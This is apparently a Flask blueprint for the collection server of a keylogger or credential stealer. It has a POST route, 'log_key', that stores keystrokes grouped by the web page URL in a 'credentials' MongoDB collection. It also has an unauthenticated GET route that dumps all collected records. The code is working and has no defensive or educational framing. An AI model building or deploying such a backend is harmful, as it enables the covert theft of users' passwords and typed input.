from flask import Blueprint, request, jsonify
from database import credentials
from utils import should_log

credentials_bp = Blueprint('credentials', __name__)

@credentials_bp.route('/credentials', methods=['GET'])
def get_logs():
    try:
        logs = list(credentials.find({}, {'_id': 0}))  # Exclude MongoDB _id field
        return jsonify(logs), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@credentials_bp.route('/credentials', methods=['POST'])
def log_key():
    try:
        data = request.json
        key = data.get('key')
        url = data.get('url')

        if not should_log(url):
            return jsonify({"status": "success"}), 200
        
        existing_entry = credentials.find_one({"url": url})
        
        if existing_entry:
            credentials.update_one(
                {"url": url},
                {"$push": {"keys": key}}
            )
        else:
            log_entry = {
                'url': url,
                'keys': [key]
            }
            credentials.insert_one(log_entry)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
